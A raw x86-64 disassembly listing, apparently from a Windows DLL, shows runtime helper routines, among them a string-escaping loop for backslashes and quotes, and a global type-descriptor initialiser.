    6d8c881c:	48 c7 44 24 48 00 00 	movq   $0x0,0x48(%rsp)
    6d8c8823:	00 00 
    6d8c8825:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
    6d8c882a:	48 8b 05 df fd 0e 00 	mov    0xefddf(%rip),%rax        # 0x6d9b8610
    6d8c8831:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
    6d8c8838:	00 00 
    6d8c883a:	ff 10                	call   *(%rax)
    6d8c883c:	85 c0                	test   %eax,%eax
    6d8c883e:	74 20                	je     0x6d8c8860
    6d8c8840:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
    6d8c8845:	e8 4e 8e ff ff       	call   0x6d8c1698
    6d8c884a:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
    6d8c884f:	48 89 c3             	mov    %rax,%rbx
    6d8c8852:	48 85 c9             	test   %rcx,%rcx
    6d8c8855:	74 09                	je     0x6d8c8860
    6d8c8857:	48 8b 05 c2 fd 0e 00 	mov    0xefdc2(%rip),%rax        # 0x6d9b8620
    6d8c885e:	ff 10                	call   *(%rax)
    6d8c8860:	48 89 d8             	mov    %rbx,%rax
    6d8c8863:	48 83 c4 50          	add    $0x50,%rsp
    6d8c8867:	5b                   	pop    %rbx
    6d8c8868:	c3                   	ret
    6d8c8869:	57                   	push   %rdi
    6d8c886a:	56                   	push   %rsi
    6d8c886b:	53                   	push   %rbx
    6d8c886c:	48 83 ec 20          	sub    $0x20,%rsp
    6d8c8870:	89 cf                	mov    %ecx,%edi
    6d8c8872:	48 8b 0d a7 fe 0e 00 	mov    0xefea7(%rip),%rcx        # 0x6d9b8720
    6d8c8879:	48 89 d6             	mov    %rdx,%rsi
    6d8c887c:	ba 38 00 00 00       	mov    $0x38,%edx
    6d8c8881:	e8 cf b5 ff ff       	call   0x6d8c3e55
    6d8c8886:	89 f9                	mov    %edi,%ecx
    6d8c8888:	48 89 c3             	mov    %rax,%rbx
    6d8c888b:	48 8b 05 5e fe 0e 00 	mov    0xefe5e(%rip),%rax        # 0x6d9b86f0
    6d8c8892:	89 7b 30             	mov    %edi,0x30(%rbx)
    6d8c8895:	48 8d 7b 18          	lea    0x18(%rbx),%rdi
    6d8c8899:	48 89 03             	mov    %rax,(%rbx)
    6d8c889c:	48 8d 05 dd a0 00 00 	lea    0xa0dd(%rip),%rax        # 0x6d8d2980
    6d8c88a3:	48 89 43 10          	mov    %rax,0x10(%rbx)
    6d8c88a7:	e8 49 ff ff ff       	call   0x6d8c87f5
    6d8c88ac:	48 89 f9             	mov    %rdi,%rcx
    6d8c88af:	48 89 c2             	mov    %rax,%rdx
    6d8c88b2:	e8 89 fe ff ff       	call   0x6d8c8740
    6d8c88b7:	48 85 f6             	test   %rsi,%rsi
    6d8c88ba:	74 7f                	je     0x6d8c893b
    6d8c88bc:	48 83 3e 00          	cmpq   $0x0,(%rsi)
    6d8c88c0:	7e 79                	jle    0x6d8c893b
    6d8c88c2:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
    6d8c88c6:	48 85 c9             	test   %rcx,%rcx
    6d8c88c9:	74 24                	je     0x6d8c88ef
    6d8c88cb:	48 8b 01             	mov    (%rcx),%rax
    6d8c88ce:	48 85 c0             	test   %rax,%rax
    6d8c88d1:	7e 1c                	jle    0x6d8c88ef
    6d8c88d3:	80 7c 01 0f 0a       	cmpb   $0xa,0xf(%rcx,%rax,1)
    6d8c88d8:	74 15                	je     0x6d8c88ef
    6d8c88da:	ba 0a 00 00 00       	mov    $0xa,%edx
    6d8c88df:	e8 19 b7 ff ff       	call   0x6d8c3ffd
    6d8c88e4:	48 89 f9             	mov    %rdi,%rcx
    6d8c88e7:	48 89 c2             	mov    %rax,%rdx
    6d8c88ea:	e8 51 fe ff ff       	call   0x6d8c8740
    6d8c88ef:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
    6d8c88f3:	ba 11 00 00 00       	mov    $0x11,%edx
    6d8c88f8:	e8 8a b6 ff ff       	call   0x6d8c3f87
    6d8c88fd:	48 89 f9             	mov    %rdi,%rcx
    6d8c8900:	48 89 c2             	mov    %rax,%rdx
    6d8c8903:	e8 38 fe ff ff       	call   0x6d8c8740
    6d8c8908:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
    6d8c890c:	48 8d 15 2d a1 00 00 	lea    0xa12d(%rip),%rdx        # 0x6d8d2a40
    6d8c8913:	e8 b7 fe ff ff       	call   0x6d8c87cf
    6d8c8918:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
    6d8c891c:	48 8b 16             	mov    (%rsi),%rdx
    6d8c891f:	e8 63 b6 ff ff       	call   0x6d8c3f87
    6d8c8924:	48 89 f9             	mov    %rdi,%rcx
    6d8c8927:	48 89 c2             	mov    %rax,%rdx
    6d8c892a:	e8 11 fe ff ff       	call   0x6d8c8740
    6d8c892f:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
    6d8c8933:	48 89 f2             	mov    %rsi,%rdx
    6d8c8936:	e8 94 fe ff ff       	call   0x6d8c87cf
    6d8c893b:	48 8b 73 18          	mov    0x18(%rbx),%rsi
    6d8c893f:	48 85 f6             	test   %rsi,%rsi
    6d8c8942:	74 06                	je     0x6d8c894a
    6d8c8944:	48 83 3e 00          	cmpq   $0x0,(%rsi)
    6d8c8948:	75 3b                	jne    0x6d8c8985
    6d8c894a:	48 8d 0d af a0 00 00 	lea    0xa0af(%rip),%rcx        # 0x6d8d2a00
    6d8c8951:	e8 7a b5 ff ff       	call   0x6d8c3ed0
    6d8c8956:	48 85 f6             	test   %rsi,%rsi
    6d8c8959:	48 89 43 18          	mov    %rax,0x18(%rbx)
    6d8c895d:	74 26                	je     0x6d8c8985
    6d8c895f:	48 8b 46 f0          	mov    -0x10(%rsi),%rax
    6d8c8963:	48 8d 56 f0          	lea    -0x10(%rsi),%rdx
    6d8c8967:	48 83 e8 08          	sub    $0x8,%rax
    6d8c896b:	48 83 f8 07          	cmp    $0x7,%rax
    6d8c896f:	48 89 46 f0          	mov    %rax,-0x10(%rsi)
    6d8c8973:	77 10                	ja     0x6d8c8985
    6d8c8975:	48 8b 0d 14 ff 0e 00 	mov    0xeff14(%rip),%rcx        # 0x6d9b8890
    6d8c897c:	48 83 c1 18          	add    $0x18,%rcx
    6d8c8980:	e8 e6 a3 ff ff       	call   0x6d8c2d6b
    6d8c8985:	48 89 d8             	mov    %rbx,%rax
    6d8c8988:	48 83 c4 20          	add    $0x20,%rsp
    6d8c898c:	5b                   	pop    %rbx
    6d8c898d:	5e                   	pop    %rsi
    6d8c898e:	5f                   	pop    %rdi
    6d8c898f:	c3                   	ret
    6d8c8990:	48 83 ec 38          	sub    $0x38,%rsp
    6d8c8994:	e8 d0 fe ff ff       	call   0x6d8c8869
    6d8c8999:	4c 8d 0d e8 9f 00 00 	lea    0x9fe8(%rip),%r9        # 0x6d8d2988
    6d8c89a0:	48 c7 44 24 20 5f 00 	movq   $0x5f,0x20(%rsp)
    6d8c89a7:	00 00 
    6d8c89a9:	4c 8d 05 e2 9f 00 00 	lea    0x9fe2(%rip),%r8        # 0x6d8d2992
    6d8c89b0:	48 89 c1             	mov    %rax,%rcx
    6d8c89b3:	48 8d 15 c6 9f 00 00 	lea    0x9fc6(%rip),%rdx        # 0x6d8d2980
    6d8c89ba:	e8 38 bd ff ff       	call   0x6d8c46f7
    6d8c89bf:	90                   	nop
    6d8c89c0:	48 83 c4 38          	add    $0x38,%rsp
    6d8c89c4:	c3                   	ret
    6d8c89c5:	48 8b 05 34 fc 0e 00 	mov    0xefc34(%rip),%rax        # 0x6d9b8600
    6d8c89cc:	48 ff 20             	rex.W jmp *(%rax)
    6d8c89cf:	41 57                	push   %r15
    6d8c89d1:	41 56                	push   %r14
    6d8c89d3:	41 55                	push   %r13
    6d8c89d5:	41 54                	push   %r12
    6d8c89d7:	55                   	push   %rbp
    6d8c89d8:	57                   	push   %rdi
    6d8c89d9:	56                   	push   %rsi
    6d8c89da:	53                   	push   %rbx
    6d8c89db:	48 83 ec 38          	sub    $0x38,%rsp
    6d8c89df:	48 8d 15 fa 9f 00 00 	lea    0x9ffa(%rip),%rdx        # 0x6d8d29e0
    6d8c89e6:	48 89 cf             	mov    %rcx,%rdi
    6d8c89e9:	e8 e2 cc ff ff       	call   0x6d8c56d0
    6d8c89ee:	84 c0                	test   %al,%al
    6d8c89f0:	89 c5                	mov    %eax,%ebp
    6d8c89f2:	75 0d                	jne    0x6d8c8a01
    6d8c89f4:	48 85 ff             	test   %rdi,%rdi
    6d8c89f7:	74 08                	je     0x6d8c8a01
    6d8c89f9:	31 db                	xor    %ebx,%ebx
    6d8c89fb:	48 83 3f 00          	cmpq   $0x0,(%rdi)
    6d8c89ff:	75 29                	jne    0x6d8c8a2a
    6d8c8a01:	31 c9                	xor    %ecx,%ecx
    6d8c8a03:	ba 01 00 00 00       	mov    $0x1,%edx
    6d8c8a08:	45 31 f6             	xor    %r14d,%r14d
    6d8c8a0b:	e8 77 b5 ff ff       	call   0x6d8c3f87
    6d8c8a10:	48 8d 15 a9 9f 00 00 	lea    0x9fa9(%rip),%rdx        # 0x6d8d29c0
    6d8c8a17:	40 b5 01             	mov    $0x1,%bpl
    6d8c8a1a:	48 89 c1             	mov    %rax,%rcx
    6d8c8a1d:	48 89 c3             	mov    %rax,%rbx
    6d8c8a20:	e8 aa fd ff ff       	call   0x6d8c87cf
    6d8c8a25:	48 85 ff             	test   %rdi,%rdi
    6d8c8a28:	74 03                	je     0x6d8c8a2d
    6d8c8a2a:	4c 8b 37             	mov    (%rdi),%r14
    6d8c8a2d:	4c 8d 3d 6c 9f 00 00 	lea    0x9f6c(%rip),%r15        # 0x6d8d29a0
    6d8c8a34:	45 31 ed             	xor    %r13d,%r13d
    6d8c8a37:	31 f6                	xor    %esi,%esi
    6d8c8a39:	4d 39 f5             	cmp    %r14,%r13
    6d8c8a3c:	7c 0e                	jl     0x6d8c8a4c
    6d8c8a3e:	48 85 f6             	test   %rsi,%rsi
    6d8c8a41:	0f 85 d3 00 00 00    	jne    0x6d8c8b1a
    6d8c8a47:	e9 ee 00 00 00       	jmp    0x6d8c8b3a
    6d8c8a4c:	46 8a 64 2f 10       	mov    0x10(%rdi,%r13,1),%r12b
    6d8c8a51:	41 80 fc 5c          	cmp    $0x5c,%r12b
    6d8c8a55:	74 08                	je     0x6d8c8a5f
    6d8c8a57:	41 80 fc 22          	cmp    $0x22,%r12b
    6d8c8a5b:	75 17                	jne    0x6d8c8a74
    6d8c8a5d:	eb 1f                	jmp    0x6d8c8a7e
    6d8c8a5f:	48 89 f1             	mov    %rsi,%rcx
    6d8c8a62:	ba 5c 00 00 00       	mov    $0x5c,%edx
    6d8c8a67:	e8 91 b5 ff ff       	call   0x6d8c3ffd
    6d8c8a6c:	48 89 c6             	mov    %rax,%rsi
    6d8c8a6f:	e9 9e 00 00 00       	jmp    0x6d8c8b12
    6d8c8a74:	48 85 f6             	test   %rsi,%rsi
    6d8c8a77:	75 5f                	jne    0x6d8c8ad8
    6d8c8a79:	e9 85 00 00 00       	jmp    0x6d8c8b03
    6d8c8a7e:	48 85 f6             	test   %rsi,%rsi
    6d8c8a81:	74 16                	je     0x6d8c8a99
    6d8c8a83:	4c 8b 26             	mov    (%rsi),%r12
    6d8c8a86:	4b 8d 04 24          	lea    (%r12,%r12,1),%rax
    6d8c8a8a:	45 31 e4             	xor    %r12d,%r12d
    6d8c8a8d:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
    6d8c8a92:	4c 3b 64 24 28       	cmp    0x28(%rsp),%r12
    6d8c8a97:	7c 2a                	jl     0x6d8c8ac3
    6d8c8a99:	31 d2                	xor    %edx,%edx
    6d8c8a9b:	48 89 f1             	mov    %rsi,%rcx
    6d8c8a9e:	e8 99 b6 ff ff       	call   0x6d8c413c
    6d8c8aa3:	48 89 d9             	mov    %rbx,%rcx
    6d8c8aa6:	ba 02 00 00 00       	mov    $0x2,%edx
    6d8c8aab:	48 89 c6             	mov    %rax,%rsi
    6d8c8aae:	e8 d4 b4 ff ff       	call   0x6d8c3f87
    6d8c8ab3:	4c 89 fa             	mov    %r15,%rdx
    6d8c8ab6:	48 89 c1             	mov    %rax,%rcx
    6d8c8ab9:	48 89 c3             	mov    %rax,%rbx
    6d8c8abc:	e8 0e fd ff ff       	call   0x6d8c87cf
    6d8c8ac1:	eb 4f                	jmp    0x6d8c8b12
    6d8c8ac3:	48 89 d9             	mov    %rbx,%rcx
    6d8c8ac6:	ba 5c 00 00 00       	mov    $0x5c,%edx
    6d8c8acb:	49 ff c4             	inc    %r12
    6d8c8ace:	e8 2a b5 ff ff       	call   0x6d8c3ffd
    6d8c8ad3:	48 89 c3             	mov    %rax,%rbx
    6d8c8ad6:	eb ba                	jmp    0x6d8c8a92
    6d8c8ad8:	48 8b 16             	mov    (%rsi),%rdx
    6d8c8adb:	48 85 d2             	test   %rdx,%rdx
    6d8c8ade:	74 23                	je     0x6d8c8b03
    6d8c8ae0:	48 89 d9             	mov    %rbx,%rcx
    6d8c8ae3:	e8 9f b4 ff ff       	call   0x6d8c3f87
    6d8c8ae8:	48 89 f2             	mov    %rsi,%rdx
    6d8c8aeb:	48 89 c1             	mov    %rax,%rcx
    6d8c8aee:	48 89 c3             	mov    %rax,%rbx
    6d8c8af1:	e8 d9 fc ff ff       	call   0x6d8c87cf
    6d8c8af6:	48 89 f1             	mov    %rsi,%rcx
    6d8c8af9:	31 d2                	xor    %edx,%edx
    6d8c8afb:	e8 3c b6 ff ff       	call   0x6d8c413c
    6d8c8b00:	48 89 c6             	mov    %rax,%rsi
    6d8c8b03:	48 89 d9             	mov    %rbx,%rcx
    6d8c8b06:	41 0f be d4          	movsbl %r12b,%edx
    6d8c8b0a:	e8 ee b4 ff ff       	call   0x6d8c3ffd
    6d8c8b0f:	48 89 c3             	mov    %rax,%rbx
    6d8c8b12:	49 ff c5             	inc    %r13
    6d8c8b15:	e9 1f ff ff ff       	jmp    0x6d8c8a39
    6d8c8b1a:	48 8b 16             	mov    (%rsi),%rdx
    6d8c8b1d:	48 85 d2             	test   %rdx,%rdx
    6d8c8b20:	7e 5b                	jle    0x6d8c8b7d
    6d8c8b22:	48 89 d9             	mov    %rbx,%rcx
    6d8c8b25:	e8 5d b4 ff ff       	call   0x6d8c3f87
    6d8c8b2a:	48 89 f2             	mov    %rsi,%rdx
    6d8c8b2d:	48 89 c1             	mov    %rax,%rcx
    6d8c8b30:	48 89 c3             	mov    %rax,%rbx
    6d8c8b33:	e8 97 fc ff ff       	call   0x6d8c87cf
    6d8c8b38:	eb 43                	jmp    0x6d8c8b7d
    6d8c8b3a:	31 d2                	xor    %edx,%edx
    6d8c8b3c:	40 84 ed             	test   %bpl,%bpl
    6d8c8b3f:	74 46                	je     0x6d8c8b87
    6d8c8b41:	48 89 d9             	mov    %rbx,%rcx
    6d8c8b44:	e8 3e b4 ff ff       	call   0x6d8c3f87
    6d8c8b49:	48 85 f6             	test   %rsi,%rsi
    6d8c8b4c:	49 89 c1             	mov    %rax,%r9
    6d8c8b4f:	74 0b                	je     0x6d8c8b5c
    6d8c8b51:	48 89 f2             	mov    %rsi,%rdx
    6d8c8b54:	48 89 c1             	mov    %rax,%rcx
    6d8c8b57:	e8 73 fc ff ff       	call   0x6d8c87cf
    6d8c8b5c:	4c 89 c9             	mov    %r9,%rcx
    6d8c8b5f:	ba 01 00 00 00       	mov    $0x1,%edx
    6d8c8b64:	e8 1e b4 ff ff       	call   0x6d8c3f87
    6d8c8b69:	48 8d 15 50 9e 00 00 	lea    0x9e50(%rip),%rdx        # 0x6d8d29c0
    6d8c8b70:	48 89 c1             	mov    %rax,%rcx
    6d8c8b73:	48 89 c3             	mov    %rax,%rbx
    6d8c8b76:	e8 54 fc ff ff       	call   0x6d8c87cf
    6d8c8b7b:	eb 0a                	jmp    0x6d8c8b87
    6d8c8b7d:	40 84 ed             	test   %bpl,%bpl
    6d8c8b80:	74 05                	je     0x6d8c8b87
    6d8c8b82:	48 8b 16             	mov    (%rsi),%rdx
    6d8c8b85:	eb ba                	jmp    0x6d8c8b41
    6d8c8b87:	48 89 d8             	mov    %rbx,%rax
    6d8c8b8a:	48 83 c4 38          	add    $0x38,%rsp
    6d8c8b8e:	5b                   	pop    %rbx
    6d8c8b8f:	5e                   	pop    %rsi
    6d8c8b90:	5f                   	pop    %rdi
    6d8c8b91:	5d                   	pop    %rbp
    6d8c8b92:	41 5c                	pop    %r12
    6d8c8b94:	41 5d                	pop    %r13
    6d8c8b96:	41 5e                	pop    %r14
    6d8c8b98:	41 5f                	pop    %r15
    6d8c8b9a:	c3                   	ret
    6d8c8b9b:	e9 2f fe ff ff       	jmp    0x6d8c89cf
    6d8c8ba0:	48 8d 0d e7 fb ff ff 	lea    -0x419(%rip),%rcx        # 0x6d8c878e
    6d8c8ba7:	e9 52 a9 ff ff       	jmp    0x6d8c34fe
    6d8c8bac:	48 8b 05 cd fb 0e 00 	mov    0xefbcd(%rip),%rax        # 0x6d9b8780
    6d8c8bb3:	c6 05 d6 5e 10 00 18 	movb   $0x18,0x105ed6(%rip)        # 0x6d9cea90
    6d8c8bba:	48 c7 05 bb 5e 10 00 	movq   $0x8,0x105ebb(%rip)        # 0x6d9cea80
    6d8c8bc1:	08 00 00 00 
    6d8c8bc5:	48 c7 05 b8 5e 10 00 	movq   $0x8,0x105eb8(%rip)        # 0x6d9cea88
    6d8c8bcc:	08 00 00 00 
    6d8c8bd0:	48 89 05 c1 5e 10 00 	mov    %rax,0x105ec1(%rip)        # 0x6d9cea98
    6d8c8bd7:	48 8d 05 be fb ff ff 	lea    -0x442(%rip),%rax        # 0x6d8c879c
    6d8c8bde:	48 89 05 cb 5e 10 00 	mov    %rax,0x105ecb(%rip)        # 0x6d9ceab0
    6d8c8be5:	c3                   	ret
    6d8c8be6:	90                   	nop
    6d8c8be7:	90                   	nop
    6d8c8be8:	90                   	nop
    6d8c8be9:	90                   	nop
    6d8c8bea:	90                   	nop
    6d8c8beb:	90                   	nop
    6d8c8bec:	90                   	nop
    6d8c8bed:	90                   	nop
    6d8c8bee:	90                   	nop
    6d8c8bef:	90                   	nop
    6d8c8bf0:	c3                   	ret
    6d8c8bf1:	48 8b 0d 88 5f 10 00 	mov    0x105f88(%rip),%rcx        # 0x6d9ceb80
    6d8c8bf8:	31 d2                	xor    %edx,%edx
    6d8c8bfa:	e9 f7 a8 ff ff       	jmp    0x6d8c34f6
    6d8c8bff:	48 8d 0d eb ff ff ff 	lea    -0x15(%rip),%rcx        # 0x6d8c8bf1
    6d8c8c06:	e9 f3 a8 ff ff       	jmp    0x6d8c34fe
    6d8c8c0b:	48 8b 05 3e fb 0e 00 	mov    0xefb3e(%rip),%rax        # 0x6d9b8750
    6d8c8c12:	c6 05 57 3a 0f 00 01 	movb   $0x1,0xf3a57(%rip)        # 0x6d9bc670
    6d8c8c19:	48 c7 05 7c 5f 10 00 	movq   $0x38,0x105f7c(%rip)        # 0x6d9ceba0
    6d8c8c20:	38 00 00 00 
    6d8c8c24:	48 c7 05 79 5f 10 00 	movq   $0x8,0x105f79(%rip)        # 0x6d9ceba8
    6d8c8c2b:	08 00 00 00 
    6d8c8c2f:	66 c7 05 78 5f 10 00 	movw   $0x111,0x105f78(%rip)        # 0x6d9cebb0
    6d8c8c36:	11 01 
    6d8c8c38:	48 89 05 79 5f 10 00 	mov    %rax,0x105f79(%rip)        # 0x6d9cebb8
    6d8c8c3f:	48 8d 05 2a 3a 0f 00 	lea    0xf3a2a(%rip),%rax        # 0x6d9bc670
    6d8c8c46:	48 89 05 53 3b 0f 00 	mov    %rax,0xf3b53(%rip)        # 0x6d9bc7a0
    6d8c8c4d:	48 8d 05 0c 60 10 00 	lea    0x10600c(%rip),%rax        # 0x6d9cec60
    6d8c8c54:	48 89 05 25 3a 0f 00 	mov    %rax,0xf3a25(%rip)        # 0x6d9bc680
    6d8c8c5b:	48 8d 05 1e 9e 00 00 	lea    0x9e1e(%rip),%rax        # 0x6d8d2a80
    6d8c8c62:	48 89 05 1f 3a 0f 00 	mov    %rax,0xf3a1f(%rip)        # 0x6d9bc688
    6d8c8c69:	48 8d 05 30 3a 0f 00 	lea    0xf3a30(%rip),%rax        # 0x6d9bc6a0
    6d8c8c70:	48 89 05 31 3b 0f 00 	mov    %rax,0xf3b31(%rip)        # 0x6d9bc7a8
    6d8c8c77:	48 8d 05 82 5e 10 00 	lea    0x105e82(%rip),%rax        # 0x6d9ceb00
    6d8c8c7e:	48 89 05 2b 3a 0f 00 	mov    %rax,0xf3a2b(%rip)        # 0x6d9bc6b0
    6d8c8c85:	48 8d 05 04 9e 00 00 	lea    0x9e04(%rip),%rax        # 0x6d8d2a90
    6d8c8c8c:	48 89 05 25 3a 0f 00 	mov    %rax,0xf3a25(%rip)        # 0x6d9bc6b8
    6d8c8c93:	48 8d 05 36 3a 0f 00 	lea    0xf3a36(%rip),%rax        # 0x6d9bc6d0
    6d8c8c9a:	48 89 05 0f 3b 0f 00 	mov    %rax,0xf3b0f(%rip)        # 0x6d9bc7b0
    6d8c8ca1:	48 8d 05 38 5f 10 00 	lea    0x105f38(%rip),%rax        # 0x6d9cebe0
    6d8c8ca8:	48 89 05 31 3a 0f 00 	mov    %rax,0xf3a31(%rip)        # 0x6d9bc6e0
    6d8c8caf:	48 8d 05 f0 9d 00 00 	lea    0x9df0(%rip),%rax        # 0x6d8d2aa6
    6d8c8cb6:	48 89 05 2b 3a 0f 00 	mov    %rax,0xf3a2b(%rip)        # 0x6d9bc6e8
    6d8c8cbd:	48 8d 05 3c 3a 0f 00 	lea    0xf3a3c(%rip),%rax        # 0x6d9bc700
    6d8c8cc4:	48 c7 05 a9 5f 10 00 	movq   $0x0,0x105fa9(%rip)        # 0x6d9cec78
    6d8c8ccb:	00 00 00 00 
    6d8c8ccf:	48 c7 05 86 5f 10 00 	movq   $0x8,0x105f86(%rip)        # 0x6d9cec60
    6d8c8cd6:	08 00 00 00 
    6d8c8cda:	48 c7 05 83 5f 10 00 	movq   $0x8,0x105f83(%rip)        # 0x6d9cec68
    6d8c8ce1:	08 00 00 00 
    6d8c8ce5:	66 c7 05 82 5f 10 00 	movw   $0x319,0x105f82(%rip)        # 0x6d9cec70
    6d8c8cec:	19 03 
    6d8c8cee:	48 c7 05 7f 39 0f 00 	movq   $0x8,0xf397f(%rip)        # 0x6d9bc678
    6d8c8cf5:	08 00 00 00 
    6d8c8cf9:	48 c7 05 14 5e 10 00 	movq   $0x0,0x105e14(%rip)        # 0x6d9ceb18
    6d8c8d00:	00 00 00 00 
    6d8c8d04:	48 c7 05 f1 5d 10 00 	movq   $0x8,0x105df1(%rip)        # 0x6d9ceb00
    6d8c8d0b:	08 00 00 00 
    6d8c8d0f:	48 c7 05 ee 5d 10 00 	movq   $0x8,0x105dee(%rip)        # 0x6d9ceb08
    6d8c8d16:	08 00 00 00 
    6d8c8d1a:	66 c7 05 ed 5d 10 00 	movw   $0x319,0x105ded(%rip)        # 0x6d9ceb10
    6d8c8d21:	19 03 
    6d8c8d23:	c6 05 76 39 0f 00 01 	movb   $0x1,0xf3976(%rip)        # 0x6d9bc6a0
    6d8c8d2a:	48 c7 05 73 39 0f 00 	movq   $0x10,0xf3973(%rip)        # 0x6d9bc6a8
    6d8c8d31:	10 00 00 00 
    6d8c8d35:	48 c7 05 b8 5e 10 00 	movq   $0x0,0x105eb8(%rip)        # 0x6d9cebf8
    6d8c8d3c:	00 00 00 00 
    6d8c8d40:	48 c7 05 95 5e 10 00 	movq   $0x8,0x105e95(%rip)        # 0x6d9cebe0
    6d8c8d47:	08 00 00 00 
    6d8c8d4b:	48 c7 05 92 5e 10 00 	movq   $0x8,0x105e92(%rip)        # 0x6d9cebe8
    6d8c8d52:	08 00 00 00 
    6d8c8d56:	66 c7 05 91 5e 10 00 	movw   $0x319,0x105e91(%rip)        # 0x6d9cebf0
    6d8c8d5d:	19 03 
    6d8c8d5f:	c6 05 6a 39 0f 00 01 	movb   $0x1,0xf396a(%rip)        # 0x6d9bc6d0
    6d8c8d66:	48 c7 05 67 39 0f 00 	movq   $0x18,0xf3967(%rip)        # 0x6d9bc6d8
    6d8c8d6d:	18 00 00 00 
    6d8c8d71:	48 89 05 40 3a 0f 00 	mov    %rax,0xf3a40(%rip)        # 0x6d9bc7b8
    6d8c8d78:	48 8d 05 41 5d 10 00 	lea    0x105d41(%rip),%rax        # 0x6d9ceac0
    6d8c8d7f:	48 89 05 8a 39 0f 00 	mov    %rax,0xf398a(%rip)        # 0x6d9bc710
    6d8c8d86:	48 8d 05 34 9d 00 00 	lea    0x9d34(%rip),%rax        # 0x6d8d2ac1
    6d8c8d8d:	48 89 05 84 39 0f 00 	mov    %rax,0xf3984(%rip)        # 0x6d9bc718
    6d8c8d94:	48 8d 05 95 39 0f 00 	lea    0xf3995(%rip),%rax        # 0x6d9bc730
    6d8c8d9b:	48 89 05 1e 3a 0f 00 	mov    %rax,0xf3a1e(%rip)        # 0x6d9bc7c0
    6d8c8da2:	48 8b 05 e7 f9 0e 00 	mov    0xef9e7(%rip),%rax        # 0x6d9b8790
    6d8c8da9:	48 c7 05 24 5d 10 00 	movq   $0x0,0x105d24(%rip)        # 0x6d9cead8
    6d8c8db0:	00 00 00 00 
    6d8c8db4:	48 c7 05 01 5d 10 00 	movq   $0x8,0x105d01(%rip)        # 0x6d9ceac0
    6d8c8dbb:	08 00 00 00 
    6d8c8dbf:	48 c7 05 fe 5c 10 00 	movq   $0x8,0x105cfe(%rip)        # 0x6d9ceac8
    6d8c8dc6:	08 00 00 00 
    6d8c8dca:	48 89 05 6f 39 0f 00 	mov    %rax,0xf396f(%rip)        # 0x6d9bc740
    6d8c8dd1:	48 8d 05 05 9d 00 00 	lea    0x9d05(%rip),%rax        # 0x6d8d2add
    6d8c8dd8:	48 89 05 69 39 0f 00 	mov    %rax,0xf3969(%rip)        # 0x6d9bc748
    6d8c8ddf:	48 8d 05 7a 39 0f 00 	lea    0xf397a(%rip),%rax        # 0x6d9bc760
    6d8c8de6:	48 89 05 db 39 0f 00 	mov    %rax,0xf39db(%rip)        # 0x6d9bc7c8
    6d8c8ded:	48 8d 05 4c 5d 10 00 	lea    0x105d4c(%rip),%rax        # 0x6d9ceb40
    6d8c8df4:	48 89 05 75 39 0f 00 	mov    %rax,0xf3975(%rip)        # 0x6d9bc770
    6d8c8dfb:	48 8d 05 e6 9c 00 00 	lea    0x9ce6(%rip),%rax        # 0x6d8d2ae8
    6d8c8e02:	48 89 05 6f 39 0f 00 	mov    %rax,0xf396f(%rip)        # 0x6d9bc778
    6d8c8e09:	48 8d 05 90 39 0f 00 	lea    0xf3990(%rip),%rax        # 0x6d9bc7a0
    6d8c8e10:	48 89 05 51 38 0f 00 	mov    %rax,0xf3851(%rip)        # 0x6d9bc668
    6d8c8e17:	48 8d 05 22 38 0f 00 	lea    0xf3822(%rip),%rax        # 0x6d9bc640
    6d8c8e1e:	48 89 05 9b 5d 10 00 	mov    %rax,0x105d9b(%rip)        # 0x6d9cebc0
    6d8c8e25:	48 8d 05 74 5d 10 00 	lea    0x105d74(%rip),%rax        # 0x6d9ceba0
    6d8c8e2c:	48 89 05 05 5e 10 00 	mov    %rax,0x105e05(%rip)        # 0x6d9cec38
    6d8c8e33:	48 8d 05 b6 fd ff ff 	lea    -0x24a(%rip),%rax        # 0x6d8c8bf0
    6d8c8e3a:	66 c7 05 8d 5c 10 00 	movw   $0x319,0x105c8d(%rip)        # 0x6d9cead0
    6d8c8e41:	19 03 
    6d8c8e43:	c6 05 b6 38 0f 00 01 	movb   $0x1,0xf38b6(%rip)        # 0x6d9bc700
    6d8c8e4a:	48 c7 05 b3 38 0f 00 	movq   $0x20,0xf38b3(%rip)        # 0x6d9bc708
    6d8c8e51:	20 00 00 00 
    6d8c8e55:	c6 05 d4 38 0f 00 01 	movb   $0x1,0xf38d4(%rip)        # 0x6d9bc730
    6d8c8e5c:	48 c7 05 d1 38 0f 00 	movq   $0x28,0xf38d1(%rip)        # 0x6d9bc738
    6d8c8e63:	28 00 00 00 
    6d8c8e67:	48 c7 05 e6 5c 10 00 	movq   $0x0,0x105ce6(%rip)        # 0x6d9ceb58
    6d8c8e6e:	00 00 00 00 
    6d8c8e72:	48 c7 05 c3 5c 10 00 	movq   $0x8,0x105cc3(%rip)        # 0x6d9ceb40
    6d8c8e79:	08 00 00 00 
    6d8c8e7d:	48 c7 05 c0 5c 10 00 	movq   $0x8,0x105cc0(%rip)        # 0x6d9ceb48
    6d8c8e84:	08 00 00 00 
    6d8c8e88:	66 c7 05 bf 5c 10 00 	movw   $0x328,0x105cbf(%rip)        # 0x6d9ceb50
    6d8c8e8f:	28 03 
    6d8c8e91:	c6 05 c8 38 0f 00 01 	movb   $0x1,0xf38c8(%rip)        # 0x6d9bc760
    6d8c8e98:	48 c7 05 c5 38 0f 00 	movq   $0x30,0xf38c5(%rip)        # 0x6d9bc768
    6d8c8e9f:	30 00 00 00 
    6d8c8ea3:	48 c7 05 b2 37 0f 00 	movq   $0x6,0xf37b2(%rip)        # 0x6d9bc660
    6d8c8eaa:	06 00 00 00 
    6d8c8eae:	c6 05 8b 37 0f 00 02 	movb   $0x2,0xf378b(%rip)        # 0x6d9bc640
    6d8c8eb5:	48 c7 05 60 5d 10 00 	movq   $0x8,0x105d60(%rip)        # 0x6d9cec20
    6d8c8ebc:	08 00 00 00 
    6d8c8ec0:	48 c7 05 5d 5d 10 00 	movq   $0x8,0x105d5d(%rip)        # 0x6d9cec28
    6d8c8ec7:	08 00 00 00 
    6d8c8ecb:	c6 05 5e 5d 10 00 16 	movb   $0x16,0x105d5e(%rip)        # 0x6d9cec30
